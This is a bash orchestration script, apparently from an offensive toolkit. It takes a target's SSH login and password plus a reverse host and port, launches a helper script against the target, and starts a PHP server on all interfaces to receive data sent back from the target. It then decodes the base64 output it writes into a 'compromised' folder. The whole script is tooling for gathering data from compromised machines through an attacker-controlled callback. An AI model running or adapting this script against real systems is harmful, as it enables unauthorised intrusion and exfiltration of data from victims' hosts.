#!/bin/bash

CONNECT=$1
CONNECT_ARRAY=($(echo ${CONNECT} | tr "@" "\n"))
IP_HOST="${CONNECT_ARRAY[1]}"
HOST="${CONNECT}"

PASSWORD=$2
REVERSE_HOST=$3
REVERSE_PORT=$4

session_name=gather-data

directory=$(pwd)
cd ${directory} && tmux new-session -s ${session_name} -d
window1=${session_name}:1
window2=${session_name}:2
pane11=${window1}.1
pane12=${window1}.2

pane21=${window2}.1
tmux select-window -t "${window1}"
tmux send-keys -t "${pane11}" "./screen.sh ${HOST} ${REVERSE_HOST} ${REVERSE_PORT} ${IP_HOST} \"${PASSWORD}\"" ENTER

tmux split-window -t "${pane11}" -v
tmux select-pane -t "${pane12}"
tmux send-keys -t "${pane12}" "rm compromised/${IP_HOST}.b64; php -S 0.0.0.0:${REVERSE_PORT}" ENTER

tmux new-window
tmux send-keys -t "${pane21}" "watch -n 1 'cat compromised/${IP_HOST}.b64 | base64 -d'" ENTER

tmux select-window -t "${window2}"
tmux select-pane -t "${pane21}"
sleep 7

# can attach to see what is going on .. DEBUGGING
#tmux attach -t gather-data
# once you detach it will kill-session (see below)

#kill tmux session
tmux kill-session -t ${session_name}

#cat compromised/${IP_HOST}.b64 | base64 -d